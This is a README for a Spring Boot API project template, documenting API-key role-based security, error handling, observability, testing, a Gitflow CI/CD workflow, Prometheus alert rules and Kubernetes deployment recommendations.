VALUES ('my-first-client', 'My first client', 'my-first-client@gmail.com', true, NOW(), NOW());
INSERT INTO api_key (company_id, name, key, is_active, created_at, updated_at)
VALUES (3, 'apikey My first client', 'apikey-client', true, NOW(), NOW());
```

## API endpoints

### Customer

- **Description:** Client-facing API.
- **Authorization:**: It verifies the API key company's role is `company.is_customer`.
- **URL:**
    - `{{host}}/v1/api`:
        - GET - hello world

### Internal

- **Description:** Expose APIs for external services such as schedulers, jobs, webhooks etc.
- **Authorization:**: It verifies the API key company's role is `company.is_internal`.
- **URL:** `{{host}}/internal`

### Management

- **Description:** API for managing and maintaining the platform.
- **Authorization:**: It verifies the API key company's role is `company.is_management`.
- **URL:**
    - `{{host}}/management/companies`
        - GET - List all companies
        - GET - Get company by id
        - POST - Create company
        - PUT - Update company
        - PATCH - Patch company
        - DELETE - Delete company
    - `{{host}}/management/api-keys`
        - GET - List all api-keys
        - GET - Get api-keys by id
        - POST - Create api-keys
        - DELETE - Inactivate api-keys

### Public

- **URL:** `{{host}}/public`
- **Description:** Provides public facing information.

## API definitions and specific implementations

### General

- API requests/responses only use the necessary information to optimize payload processing and
  network transfer costs.
- The `apikey.key` is always excluded from logs.
- Management APIs use pagination to limit the response payload size.
- The maximum page size is set to 20 to prevent potential memory issues.
- As your entities grow, you might want to reimplement the pagination mechanism to avoid the count
  query in PostgreSQL, as it is very slow on large tables.
- All management APIs are built using a generic `BaseManagementController` that leverages
  sophisticated use of generics. The differences lie in their request and response implementations,
  making it really easy to add any management APIs.

```java

@Getter
@Slf4j
@RestController
@RequestMapping(CompanyManagementController.BASE_URL)
@RequiredArgsConstructor
public class CompanyManagementController
    extends BaseManagementController<
    Company,
    Long,
    CreateCompanyManagementRequest,
    UpdateCompanyManagementRequest,
    PatchCompanyManagementRequest,
    CompanyManagementResponse> {

  public static final String BASE_URL = AppUrls.MANAGEMENT_API + ""/companies"";

  private final CompanyService service;
  private final CompanyMapper mapper;
}

/**
 * The class Base management controller.
 *
 * @param <E> the type parameter Entity
 * @param <I> the type parameter ID
 * @param <C> the type parameter CreateRequest
 * @param <U> the type parameter UpdateRequest
 * @param <P> the type parameter PatchRequest
 * @param <R> the type parameter Response
 */
@Slf4j
public abstract class BaseManagementController<
    E extends BaseEntity<I>, I extends Serializable, C, U, P, R> {
  public abstract BaseManagementMapper<E, C, U, P, R> getMapper();
  public abstract BaseService<E, I> getService();
}

/**
 * The interface Base mapper management.
 *
 * @param <E> the type parameter Entity
 * @param <C> the type parameter CreateRequest
 * @param <U> the type parameter UpdateRequest
 * @param <P> the type parameter PatchRequest
 * @param <R> the type parameter Response
 */
public interface BaseManagementMapper<E, C, U, P, R> {

  @ToEntity
  E toEntity(C request);

  @ToEntity
  E updateWithManagementRequest(U request, @MappingTarget E entity);

  @ToEntity
  @BeanMapping(nullValuePropertyMappingStrategy = NullValuePropertyMappingStrategy.IGNORE)
  E patchWithManagementRequest(P request, @MappingTarget E entity);

  R toManagementResponse(E entity);
}
```

### Feature optimization

#### Validation

- This is specific to your home assignment project, add some context or remove it. I personally put the request validations and why.

#### Implementation

- This is specific to your home assignment project, add some context or remove it. 
  I personally put the specific implementation that was asked in the project.

## Authentication and Authorization

The application implements an API key-based authentication. It uses Role-Based Access Control (RBAC)
based on company attributes such as 'is_customer', 'is_management', and 'is_internal'. I personally
prefer to repeat this information per table (instead of using a satellite table) using boolean
column for better data manipulation and security.

Authorization is verified at the API entry, but the architecture allows RBAC verification at any
level of the application, including individual service methods using the `@hasRole()` annotation.
For enhanced security, the system follows a deny-by-default approach, where all URLs are initially
denied access, and authorization is granted on a case-by-case basis, strictly adhering to the
defined access policies.

```java

@Bean
public SecurityFilterChain securityFilterChain(final HttpSecurity http) throws Exception {

  http.addFilterBefore(
          new ApiKeyAuthenticationFilter(
              AppUrls.MANAGEMENT_API + ""/**"", this.authenticationManager()),
          AnonymousAuthenticationFilter.class)
      .addFilterBefore(
          new ApiKeyAuthenticationFilter(
              AppUrls.INTERNAL_API + ""/**"", this.authenticationManager()),
          AnonymousAuthenticationFilter.class)
      .addFilterBefore(
          new ApiKeyAuthenticationFilter(
              AppUrls.CUSTOMER_API + ""/**"", this.authenticationManager()),
          AnonymousAuthenticationFilter.class)
      .authorizeHttpRequests(
          authorize ->
              authorize
                  // Management API
                  .requestMatchers(AppUrls.MANAGEMENT_API + ""/**"")
                  .hasAnyRole(UserRoles.MANAGEMENT_API_USER.getRole())

                  // Internal API
                  .requestMatchers(AppUrls.INTERNAL_API + ""/**"")
                  .hasAnyRole(UserRoles.INTERNAL_API_USER.getRole())

                  // Customer API
                  .requestMatchers(AppUrls.CUSTOMER_API + ""/**"")
                  .hasAnyRole(UserRoles.CUSTOMER_API_USER.getRole())

                  // Actuator API
                  .requestMatchers(""/actuator/**"")
                  .permitAll()

                  // Public API
                  .requestMatchers(AppUrls.PUBLIC + ""/**"")
                  .permitAll()

                  // Authorize global error page.
                  .requestMatchers(""/error"")
                  .permitAll()

                  // Else deny all request by default.
                  .anyRequest()
                  .denyAll())
      .csrf(AbstractHttpConfigurer::disable)
      .sessionManagement(
          session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
      .httpBasic(AbstractHttpConfigurer::disable)
      .formLogin(AbstractHttpConfigurer::disable)
      .logout(AbstractHttpConfigurer::disable);

  return http.build();
}
```

For more granular access control, the system can be extended to support Attribute-Based Access
Control (ABAC), providing fine-grained authorization based on a combination of attributes beyond
just roles. However, for simplicity, I limited the implementation to RBAC.

To enhance identity management, I would recommend moving to a centralized identity provider such as
Keycloak or Okta. This approach allows you to focus on creating value for your product instead of
managing identity and access concerns, which typically do not create intrinsic value for your
product.

All authentication interactions are managed by an `AuthFacade`, which simplifies data retrieval and
encapsulates complexity.

## Exception Handling

Exception handling is centralized in the `GlobalExceptionHandler` class to ensure consistent and
normalized error responses. It adheres to the Problem Details for HTTP APIs specification defined
in [RFC 9457](https://www.rfc-editor.org/rfc/rfc9457). I have also overridden the `ErrorAttributes` 
class to normalize exceptions thrown before the Spring MVC context.

All application exceptions extend the `RootException` to provide a normalized error message.

```java

@Getter
public class RootException extends RuntimeException {

  @Serial
  private static final long serialVersionUID = 6378336966214073013L;

  private final HttpStatus httpStatus;
  private final List<ApiErrorDetails> errors = new ArrayList<>();

  public RootException(@NonNull final HttpStatus httpStatus) {
    super();
    this.httpStatus = httpStatus;
  }

  public RootException(@NonNull final HttpStatus httpStatus, final String message) {
    super(message);
    this.httpStatus = httpStatus;
  }
}
```

They are caught inside the `rootException` function in the `GlobalExceptionHandler`:

```java

@ExceptionHandler(RootException.class)
public ResponseEntity<ProblemDetail> rootException(final RootException ex) {
  log.info(ex.getMessage(), ex);

  if (ex.getHttpStatus().is5xxServerError()) {
    this.slack.notify(format(""[API] InternalServerError: %s"", ex.getMessage()));
  }

  // message can be removed if necessary for security purpose.
  final ProblemDetail problemDetail =
      this.buildProblemDetail(ex.getHttpStatus(), ex.getMessage(), ex.getErrors());
  return ResponseEntity.status(ex.getHttpStatus()).body(problemDetail);
}
```

Example:

```json
{
  ""type"": ""about:blank"",
  ""title"": ""Internal Server Error"",
  ""status"": 500,
  ""detail"": ""Something went wrong. Please try again later or enter in contact with our service."",
  ""instance"": ""/v1/api""
}
```

```json
{
  ""type"": ""about:blank"",
  ""title"": ""Bad Request"",
  ""status"": 400,
  ""detail"": ""Validation failed."",
  ""instance"": ""/management/companies"",
  ""errors"": [
    {
      ""pointer"": ""slug"",
      ""reason"": ""must not be blank""
    }
  ]
}
```

## Infra

### Caching

The application utilizes [Valkey](https://valkey.io/) as a caching provider to enhance performance.
Frequently accessed entities such as Company and ApiKey are cached, reducing the
need for repeated database queries and improving response times. I would recommend deploying at
least two replicas for better availability, as it is a critical dependency.

### Image building

The application utilizes [Buildpack](https://buildpacks.io/) to construct a production-ready image
optimized for runtime efficiency, embedding security best practices and resource-aware container
capabilities.

### JVM options

- The API
  uses [virtual threads](https://docs.oracle.com/en/java/javase/21/core/virtual-threads.html) for
  better scalability.
- The memory configurations are done automatically thanks to buildpack.

## Observability

It uses OpenTelemetry agent to collect detailed metrics and tracing data.

### Metrics

All metrics are generated automatically by the OpenTelemetry agent. To export the metrics
you can set the property `otel.metrics.exporter=otlp` in `opentelemetry/dev.properties` or set
the environment variable `OTEL_METRICS_EXPORTER=otlp` and specify the corresponding OTLP
endpoint in `otel.exporter.otlp.endpoint`.

### Logging

A logback configuration is defined with the following pattern for `json-logs` profile:

```json
{
  ""level"": ""%level"",
  ""company"": ""%mdc{company}"",
  ""user"": ""%mdc{user}"",
  ""message"": ""%message"",
  ""traceId"": ""%mdc{trace_id}"",
  ""spanId"": ""%mdc{span_id}"",
  ""traceFlags"": ""%mdc{trace_flags}"",
  ""logger"": ""%logger"",
  ""thread"": ""%thread""
}
```

By setting the MDC (Mapped Diagnostic Context) in the request filter `AddCredsToMDCFilter`, we are
able to inject the company slug and user email in every log. The trace_id, span_id, and
trace_flags are provided automatically by the OpenTelemetry agent. For the default log pattern,
it sets the property `logging.pattern.correlation` to `""[${spring.application.name:},%X
{trace_id:-},%X{span_id:-},%X{trace_flags:-}]""`. It assumes that the logs will be picked up
automatically by a daemon set agent, usually present in every node of a Kubernetes cluster or
server.

### Log strategy

- GET requests are logged at the debug level.
- CREATE, UPDATE, and DELETE requests are logged at the info level.
- It logs asynchronously every entity that is created, updated, deleted, or rolled back through
  a `@TransactionalEventListener` to ensure strict traceability of every entity change.
- As explained previously the company and user information are incorporated into the log context
  for better traceability.
- As explained previously a dedicated profile `json-logs` is available for logging in JSON format,
  facilitating easier integration with log management tools.

Example:

```json
{
  ""@timestamp"": ""2024-06-17T18:44:28.936466065-03:00"",
  ""level"": ""INFO"",
  ""company"": ""my-management-company"",
  ""user"": ""my-management-company@gmail.com"",
  ""message"": ""[request] create CreateCompanyManagementRequest[slug=lgdeu9f, name=wfo1bno, officialName=xoi5v6i, federalTaxId=98993450256806, stateTaxId=27902738255513, phone=1397661651, email=company@gmail.com, addressStreet=rua test, addressStreetNumber=11, addressComplement=test, addressCityDistrict=Pinheiros, addressPostCode=05415090, addressCity=Sao paulo, addressStateCode=SP, addressCountry=addressCountry, addressLatitude=50, addressLongitude=10, isManagement=true, isInternal=false, isCustomer=false]"",
  ""traceId"": ""e95a913e31679890788fdc6bf8ffce4b"",
  ""spanId"": ""eca2a54db44b2fa8"",
  ""traceFlags"": ""01"",
  ""logger"": ""com.project.api.controllers.management.base.BaseManagementController"",
  ""thread"": ""tomcat-handler-1""
}
{
  ""@timestamp"": ""2024-06-17T18:44:28.937314985-03:00"",
  ""level"": ""INFO"",
  ""company"": ""my-management-company"",
  ""user"": ""my-management-company@gmail.com"",
  ""message"": ""[creating] company Company{id=null, slug='lgdeu9f', name='wfo1bno', officialName='xoi5v6i', federalTaxId='98993450256806', stateTaxId='27902738255513', phone='1397661651', email='company@gmail.com', addressStreet='rua test', addressStreetNumber='11', addressComplement='test', addressCityDistrict='Pinheiros', addressPostCode='05415090', addressCity='Sao paulo', addressStateCode='SP', addressCountry='addressCountry', addressLatitude=50, addressLongitude=10, isCustomer=false, isManagement=true, isInternal=false, createdBy='null', updatedBy='null', createdAt=null, updatedAt=null}"",
  ""traceId"": ""e95a913e31679890788fdc6bf8ffce4b"",
  ""spanId"": ""eca2a54db44b2fa8"",
  ""traceFlags"": ""01"",
  ""logger"": ""com.project.api.services.base.BaseService"",
  ""thread"": ""tomcat-handler-1""
}
{
  ""@timestamp"": ""2024-06-17T18:44:28.946102329-03:00"",
  ""level"": ""INFO"",
  ""company"": """",
  ""user"": """",
  ""message"": ""[created] company 5"",
  ""traceId"": ""e95a913e31679890788fdc6bf8ffce4b"",
  ""spanId"": ""eca2a54db44b2fa8"",
  ""traceFlags"": ""01"",
  ""logger"": ""com.project.api.listeners.EntityTransactionLogListener"",
  ""thread"": ""task-2""
}
```

### Tracings

To export the traces, set the property `otel.traces.exporter=otlp` in `opentelemetry/dev.properties`
or set the environment variable `OTEL_TRACES_EXPORTER=otlp` and specify the
corresponding OTLP endpoint in `otel.exporter.otlp.endpoint`. For debugging, you can use the
[OpenTelemetry Desktop Viewer](https://github.com/CtrlSpice/otel-desktop-viewer).

### Profiling

To provide better memory management and debugging,
a [Pyroscope](https://github.com/grafana/pyroscope) agent configuration has been created. You can
activate it by setting the property `pyroscope.enabled` to `true`.

## Unit & Integration Tests

### Strategy

I personally prefer to extensively use integration tests, employing specific techniques outlined
below to thoroughly test the application without compromising test duration. Additionally, unit
tests are executed in parallel to optimize testing duration and overall efficiency.

The application reuses the same execution context across all integration tests to significantly
improve performance. PostgreSQL and Redis instances are shared across test executions, optimizing
resource utilization and reducing the overall testing duration. Additionally, `MockMvc` is
automatically configured for all APIs, simplifying the testing configuration process.

With these optimizations in place, adding a new integration test incurs a relatively low marginal
cost, typically ranging between 5 and 25 milliseconds.

I have found this method to be highly effective for testing the entire application, especially in
logistics, where extensive business rule verification is required.

This approach is implemented by having all integration tests extend `BaseIntegrationTest`.

```java

@ActiveProfiles(""test"")
@AutoConfigureMockMvc
@TestInstance(Lifecycle.PER_CLASS)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public abstract class BaseIntegrationTest {

  private static final ObjectMapper defaultObjectMapper =
      new ObjectMapper()
          .configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false)
          .setPropertyNamingStrategy(LOWER_CAMEL_CASE)
          .registerModule(new JavaTimeModule());

  @Container
  @ServiceConnection
  public static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>(""postgres:16-alpine"");

  @Container
  static RedisContainer redis =
      new RedisContainer(parse(""bitnami/valkey:7.2""))
          .withEnv(Map.of(""VALKEY_PASSWORD"", ""password""));

  static {
    Startables.deepStart(postgres, redis).join();
  }

  @Autowired
  public MockMvc mockMvc;

  @DynamicPropertySource
  static void applicationProperties(final DynamicPropertyRegistry registry) {
    registry.add(""redis.port"", () -> redis.getMappedPort(6379));
  }

}
```

### Application tests

The api implements the following unit and integration tests:

![tests](./documentation/unit-and-it-tests.png)

They mostly focus on:

- Authentication and authorization for every APIs

With more time I would have created many more tests to improve test coverage.

## CI/CD

### Git Workflow

I opted for a conservative approach using Gitflow due to the limited context. Depending on the
product development context, I would recommend using a trunk-based
workflow for more streamlined development.

![gitflow](./documentation/gitflow.png)

### Release workflow

It is implemented to prevent manual intervention and interact solely with pull requests, mitigating
potential bugs.

**Development environment - Feature Development**

- Create `feature/xxxx` branch from `develop`.
- Open a pull request from `feature/xxxx` into `develop`.
    - The CI will automatically:
        - Run all tests.
- Merge and close the PR:
    - The CI will automatically:
        - Run all tests.
        - Deploy the image to dev image registry using workload identity federation.

Repeat steps 1, 2, and 3 as necessary during feature development iterations.

**Testing/Staging environment - Release Candidate**

- From `develop` branch:
  ```bash
  make release
  ```
    - It will automatically calculate the release number and open the PR from `release/x.x`
      to `main`.
    - The CI will automatically:
        - Run all tests.
        - Deploy the image to test image registry using workload identity federation.

**Production environment**

- Merge and close the PR `release/x.x` into `main`.
    - The CI will automatically:
        - Run all tests.
        - Deploy the image to prod image registry using workload identity federation.
        - Create release.
        - Open PR to align `develop` with `main` in case modifications were made in the PR.

### Hotfix workflow

**Testing/Staging environment - Release Candidate**

- From `main` branch:
  ```bash
  make hotfix
  ```
    - It will automatically calculate the release number and open the PR from `release/x.x`
      to `main`.
    - The CI will automatically:
        - Run all tests.
        - Deploy the image to test image registry.

**Production environment**

- Merge and close the PR `release/x.x` into `main`.
    - The CI will automatically:
        - Run all tests.
        - Deploy the image to prod image registry using workload identity federation.
        - Create release.
        - Open PR to align `develop` with `main` since `develop` do not have the hotfix
          modification.

You can have a look at their implementations:

![gitflow](./documentation/github-conf.png)

### Branching Strategy

This workflow involves managing five types of branches:

- **Long-lived branches:**
    - `main`: Always reflects the production state.
    - `develop`: Always mirrors the state with the latest development changes for the upcoming
      release.

- **Short-lived branches:**
    - `feature/*`: Branches off from `develop` for developing new features.
    - `release/*`: Branches off from `develop` when a set of features is ready for deployment
      to `main`.
    - `hotfix/*`: Branches off from `main` for quick fixes that need immediate deployment to `main`.

### Continuous Deployment

#### Strategy

I personally prefer to limit the CI pipeline to tests and push the image to registry. This
workflow expects an external continuous deployment agent such
as [ArgoCD](https://argoproj.github.io/cd/) paired
with [ArgoCD Image Updater](https://argoproj.github.io/cd/) (or [Kargo](https://github.com/akuity/kargo)) to automatically deploy the new image.

This approach ensures that the CI pipeline focuses solely on:

- Running tests of any kind, static code analysis, security measures [...].
- Creating and pushing the Docker image to a registry.

#### Deployment

After the new image has been automatically picked up, there are several deployment strategies you
can consider:

**Blue-Green Deployment**: This approach ensures zero downtime by running two identical
production environments (""blue"" and ""green""). Traffic is routed to one environment while the
other is updated. Use a `preStop` hook in your Kubernetes deployment like `command: ['sleep', '60']` for the kubelet 
to wait for a specified delay before sending the `SIGTERM` signal, ensuring graceful shutdown.

**Canary Deployment**: This strategy involves rolling out the new version to a subset of users or
servers to reduce risk. It can be done manually or automatically based on predefined metrics.
Automatic canary deployment can be quite tricky as it requires knowing adequate metrics to observe
performance and stability.

**Feature Flags**: This approach involves using conditional logic in the code to control feature
availability. It allows for gradual rollout of new features but can add complexity to the
codebase.

### Areas for Improvement

- **Performance Testing**:  Create an additional workflow to integrate [k6s](https://k6.io/) for
  critical APIs to ensure no performance regressions are made.
- **Code quality and security**:
  Use [SonarQube](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.sonarsource.com/products/sonarqube/&ved=2ahUKEwjRloDCyeWGAxVWq5UCHd3qCCsQFnoECAYQAQ&usg=AOvVaw2XrcT14PuYVcMxUcEkqccE)
  to enhance code quality and security.
- **Automated release candidate testing**: Create an additional workflow to automatically test
  release candidates in your test environment. Trigger a webhook after a successful
  application deployment (using argo-notification for example), which will initiate a GitHub Action
  workflow to execute end-to-end (e2e) tests.

## GitHub Actions configuration

### Branch: develop

- **Restrict deletions**: Prevent `develop` branch deletion.
- **Restrict PR before merging**: Require all pull requests to be up-to-date before merging into
  `develop`.
- **Require status check**: Ensure the `dev-test` workflow passes before allowing merges into
  develop.
- **Block force push**: Prevent force pushes to the `develop` branch.

### Branch: main

- **Restrict deletions**: Prevent `main` branch deletion.
- **Restrict PR before merging**: Require all pull requests to be up-to-date before merging into
  `main`.
- **Require status checks**: Ensure both `rc-test` and `rc-deploy` workflows pass before allowing
  merges into `main`.
- **Block force push**: Prevent force pushes to the `main` branch.

### Github environments

Three environments dev, test and prod have been created to isolate workflow variables and ensure
controlled deployment.

### Release application

The GitHub release is automatically executed via a dedicated GitHub App (`jojoooo1-app`) to
enhance security and prevent the use of personal access tokens.

## Production recommendations

### Monitoring

- Use an OpenTelemetry [Collector](https://opentelemetry.io/docs/collector/) to consolidate all
  your metrics and traces. It will help you stay vendor agnostic.
- Use a Grafana dashboard like the one shown below to monitor your application:

![grafana](./documentation/grafana.png)

- This dashboard will help you detect anomalies, bottlenecks, and other issues by providing insights
  into API response times, connection pooling, CPU and memory usage, request volumes, and more.
- Aim to keep all your API requests below 20/25ms to ensure adequate scaling.
- Try to keep all your database operations below 1ms. Utilize tools
  like [pg_stat_statements](https://www.postgresql.org/docs/current/pgstatstatements.html) or Cloud
  SQL [query insights](https://cloud.google.com/sql/docs/postgres/using-query-insights) for
  diagnosing your slowest queries easily. Exclude queries from background jobs, as they typically
  run slower.

### Logging

- Monitor your warning and error logs daily to proactively detect API errors. Here's an example
  that I like to use:

![logs](./documentation/logs.png)

### Alerting

- The application integrates a Slack client that alerts on all internal errors, providing error
  messages with links to search your tracing and logging systems with the corresponding `trace_id`.
  These two links significantly reduce debugging time.

![gitflow](./documentation/alert-slack.png)

- Automate monitoring using alerting rules. I usually like to begin with the following setup:

```yaml
        - alert: ContainerHighCpuUtilization
          expr: (sum(rate(container_cpu_usage_seconds_total{container!=""""}[5m])) by (pod, container) / sum(container_spec_cpu_quota{container!=""""}/container_spec_cpu_period{container!=""""}) by (pod, container) * 100) > 80
          for: 2m
          labels:
            severity: warning
          annotations:
            summary: ""Container High CPU utilization in pod {{ $labels.pod }}""
            description: ""Container CPU utilization is above 80%\n VALUE = {{ $value }}""
        
        - alert: ContainerHighMemoryUsage
          expr: (sum(container_memory_working_set_bytes{name!=""""}) BY (instance, name) / sum(container_spec_memory_limit_bytes > 0) BY (instance, name) * 100) > 80
          for: 2m
          labels:
            severity: warning
          annotations:
            summary: ""Container High Memory usage in pod {{ $labels.pod }}""
            description: ""Container Memory usage is above 80%\n  VALUE = {{ $value }}""
        
        - alert: ContainerVolumeUsage
          expr: (1 - (sum(container_fs_inodes_free{name!=""""}) BY (instance) / sum(container_fs_inodes_total) BY (instance))) * 100 > 80
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: ""Container High Volume usage in pod {{ $labels.pod }}""
            description: ""Container Volume usage is above 80%\n  VALUE = {{ $value }}""
        
        
        - alert: ContainerHighThrottleRate
          expr: sum(increase(container_cpu_cfs_throttled_periods_total{container!=""""}[5m])) by (container, pod, namespace) / sum(increase(container_cpu_cfs_periods_total[5m])) by (container, pod, namespace) > ( 25 / 100 )
          for: 5m
          labels:
            severity: info
          annotations:
            description: ""Container high throttle rate in pod {{ $labels.pod }}.""
            summary: ""Container is being throttled\n  VALUE = {{ $value }}""
            runbook_url: https://runbooks.prometheus-operator.dev/runbooks/kubernetes/cputhrottlinghigh
        
        - alert: JvmMemoryFillingUp
          expr: (sum by (instance)(jvm_memory_used_bytes{area=""heap""}) / sum by (instance)(jvm_memory_max_bytes{area=""heap""})) * 100 > 80
          for: 2m
          labels:
            severity: warning
          annotations:
            summary: ""JVM memory filling up (pod {{ $labels.pod }})""
            description: ""JVM memory is filling up (> 80%) VALUE = {{ $value }}""
        
        # Probably indicate some long-running queries that need to be killed, or it could degrade your system.
        - alert: PostgresqlTooManyDeadTuples
          expr: ""pg_stat_user_tables_n_dead_tup > 150000""
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: 'Postgresql too many dead tuples for table ""{{ $labels.schemaname }}.{{ $labels.relname }}""'
            description: 'PostgreSQL dead tuples is too large VALUE = {{ $value }}'
        
        # Your Change Data Capture (CDC) system might have encountered an exception, causing the replication process to stop. 
        # Be very careful as your disk size can grow indefinitely.
        # Usually it is pretty bad as you can not decrease your disk size after cleaning the WAL and you will pay an extra fee for disk size you do not use
        - alert: PostgresqlUnusedReplicationSlot
          expr: 'pg_replication_slots_active{slot_name!~"".*bigquery.*""} == 0'
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: 'Postgresql unused replication slot ""{{ $labels.slot_name }}""'
            description: 'Unused Replication Slots VALUE = {{ $value }}'
```

In that case, you will need a
PostgreSQL [exporter](https://github.com/prometheus-community/postgres_exporter) to translate
PostgreSQL metrics into Prometheus metrics.

Also add some additional performance rules like the following:

```yaml
        - alert: ApiCreateCompanyExceeds40ms
          expr: irate(http_server_requests_seconds_sum{application=""api"", uri=""/api/v1/management/companies"", exception=""None""}[10m]) / irate(http_server_requests_seconds_count{application=""api"", uri=""/api/v1/management/companies"", exception=""None"" }[ 10m ]) > 0.040
          for: 10m
          labels:
            severity: warning
          annotations:
            summary: ""Company API seems too slow in pod '{{ $labels.pod }}'""
            description: 'response time is too high {{ $value | printf ""%.2f"" }}ms'
        
        - alert: ApiSuccessRateBelow90Percent
          expr: sum by(uri) (http_server_requests_seconds_count{status=~""2.*""}) / sum by(uri) (http_server_requests_seconds_count{}) < 0.90
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: ""Api '{{ $labels.uri }}' success rate is below 90% for the past 5min""
            description: 'success rate is {{ $value | printf ""%.2f"" }}'
```

Eventually, create a runbook to guide your operations team in handling errors. While this example is
generic, as your application matures, develop more detailed guidelines to mitigate service
disruptions. Continuously adjust your dashboard and alert thresholds to avoid alert fatigue.

### High Availability (HA)

Ensure high availability with:

- **Replicas**: Maintain a minimum of 2 replicas.
- **Autoscaling**: Implement autoscaling based on CPU and memory metrics (or other) to efficiently
  handle varying workload demands.
- **Anti-Affinity**: Create an anti-affinity rule to distribute replicas across different nodes
  or zones, improving fault tolerance.
- **PodDisruptionBudget**: Create a `PodDisruptionBudget` with at least 2 replicas to prevent
  issues or failures during Kubernetes operations.
- **Database**: Implement a fallback strategy in another region to mitigate risks and
  ensure continuous availability in case of regional failures.
- **Cache**: Same as database to ensure availability during regional issues or failures.

### Database

- Use [pgTune](https://pgtune.leopard.in.ua/) for the initial PostgreSQL configuration.
- Set autovacuum thresholds to 5000/10000 for highly updatable tables to optimize vacuum operation
  and table performance. For example:
  ```sql
  ALTER TABLE company SET (
    autovacuum_vacuum_scale_factor = 0.0,
    autovacuum_vacuum_threshold = 5000,
    autovacuum_analyze_scale_factor = 0.0,
    autovacuum_analyze_threshold = 5000
  );
  ```
- Consider adjusting `autovacuum_vacuum_cost_delay`, `autovacuum_work_mem`,
  and `maintenance_work_mem` settings to improve vacuum performance.
- The API uses HikariCP for efficient database connection management. If
  your database connections start to grow, consider using a centralized solution
  like [PgBouncer](https://github.com/pgbouncer/pgbouncer).
- The API initial pool size is set to 20 connections, keep it as low as possible for better
  performance.
- Always prefer partial indexes.
- Avoid using `order by` on none indexed column
- Avoid sharding or partitioning unless necessary. It can introduce
  significant complexity and overhead if not implemented carefully.
- Create a read replica for offloading analytical queries or business intelligence workloads, as
  this can help maintain performance for the primary database. If the read replica becomes a
  bottleneck, consider replicating data to an OLAP database
  like [ClickHouse](https://clickhouse.com/) using CDC.
- Monitor replication status to avoid WAL logs accumulating leading to **unlimited** disk growth.

### Security

To enhance security, consider implementing the following measures:

- **CORS Configuration**: Although no specific CORS configuration is applied, ensure CORS policies
  align with API security requirements.
- **IP Whitelisting**: Restrict access by whitelisting client IP addresses.
- **Rate Limiting**: Implement rate limiting to protect against excessive API requests.
- **Web Application Firewall (WAF)**: Use a WAF to filter and monitor HTTP traffic.
- **Namespace Traffic Restriction**: Enhance isolation by restricting traffic within the same Kubernetes
  namespaces.
- **Image User Privileges**: Always run the image as non-root user `1000` to prevent privilege
  escalation.
- **Cloud SQL Proxy**: Use Cloud SQL Proxy to ensure secure connections to your Cloud SQL instances.
- **API Exposure**: Only expose APIs through a load balancer to control and monitor incoming traffic
  effectively.
- **Actuator Port**: Avoid exposing the Actuator port externally; limit access to serviceMonitor
  only.
- **Secret Management**: Retrieve secrets securely from Vault using a secret operator.
- **Service Accounts with Workload Identity**: Always utilize service accounts with workload
  identity for secure access control.
- **Supply Chain Security**: The API implements an SBOM endpoint at `/actuator/sbom/application` to
  analyze supply chain vulnerabilities.
- **Code Quality** Use tools for code quality and static analysis like SonarQube
- **Deployment**: Use secure Kubernetes deployment as follows:

```yaml
    spec:
      containers:
        - name: api
          image: ""<your-image-registry>""
          ports:
            - name: container-port
              containerPort: 8080
            - name: metrics
              containerPort: 8081
          
          readinessProbe:
            initialDelaySeconds: 15
            periodSeconds: 10
            httpGet:
              path: /actuator/health/readiness
              port: metrics
          livenessProbe:
            httpGet:
              path: /actuator/health/liveness
              port: metrics
            initialDelaySeconds: 15
            periodSeconds: 10
          
          lifecycle:
            preStop:
              exec:
                command:
                  - sleep
                  - 10
          
          # Uses adequate requests resources. Always set requests equal to limits and do not set 
          # CPU limit on important deployments to prevent CPU throttling.
          resources:
            requests:
              memory: 768Mi
              cpu: 500m
            limits:
              memory: 768Mi
          
          # Tighten security context
          securityContext:
            readOnlyRootFilesystem: true
            allowPrivilegeEscalation: false
            capabilities:
              drop:
                - ALL
            runAsNonRoot: true
            runAsUser: 1000
          
          volumeMounts:
            - name: tmp-volume
              mountPath: /tmp
      
      # Necessary for readOnly system
      volumes:
        - name: tmp-volume
          emptyDir: { }    
```

## Formatting

It uses [Git Code Format Maven Plugin](https://github.com/Cosium/git-code-format-maven-plugin)
to unify Java formatting. On commit, the hook will automatically format staged files.

## Postman Collection

Import Postman collection to quickly get started.

API collection:

[![Collection](https://run.pstmn.io/button.svg)](https://github.com/Jojoooo1/project-assignment/tree/develop/postman/API.postman_collection.json)

Dev environment:

[![Dev environement](https://run.pstmn.io/button.svg)](https://github.com/Jojoooo1/project-assignment/tree/develop/postman/dev.postman_environment.json)

Authentication is configured in their respective parent folders to prevent redundancy:
![postman-apikey](./documentation/postman-apikey.png)

Requests that require random values are handled through pre-request scripts:
![postman-request](./documentation/postman-request.png)

Variables used in the URL are automatically set after a successful response:
![postman-var-set](./documentation/postman-var-set.png)


## Running the project

### Dependencies

The dependencies of the project are:

* OpenJDK Java version >= 21
* [Docker](https://www.docker.com)
* [Docker Compose](https://docs.docker.com/compose/)
* [Maven](https://maven.apache.org/)

### Run project

```bash
make start-all
```

The command above may encounter Docker permission issues with project volume directories, in case
you face similar problems like the error below:

> *[ERROR] Failed to execute goal org.apache.maven.plugins:maven-clean-plugin:3.2.0:clean (
default-clean) on project api: Failed to clean project: Failed to delete*

Apply permissions to the project directory like this:

```bash
sudo chmod a+rwx -R ~/repos-dir/api 
```

This command grants read, write, and execute permissions (rwx) to all users (a) recursively (-R) for
the directory `~/repos-dir/api`. Adjust the path (`~/repos-dir/api`) to
match your specific project directory.

### Debug project

Start the infra dependencies:

```bash
make start-infra
```

And run the project by using Intellij (do not forget to set SPRING_PROFILES_ACTIVE=dev) or mvn
directly:

```bash
make run-api
```

### Test project

```bash
make test
```

### Clean project

```bash
make kill
```

